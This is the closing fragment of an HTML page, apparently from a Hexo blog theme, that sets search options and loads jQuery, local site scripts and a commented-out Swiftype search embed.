  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
</script>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>

<script src="/js/search.js"></script>
<script src="/js/app.js"></script>

<!-- Disqus -->



<!-- Swiftype -->
<!-- Please replace with your own swiftype settings -->
<!--
<script type="text/javascript">
  /* Swiftype */
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
</script>
-->

  <script>document.getElementById("loading-bar").style.width="100%";</script>
</body>
</html>
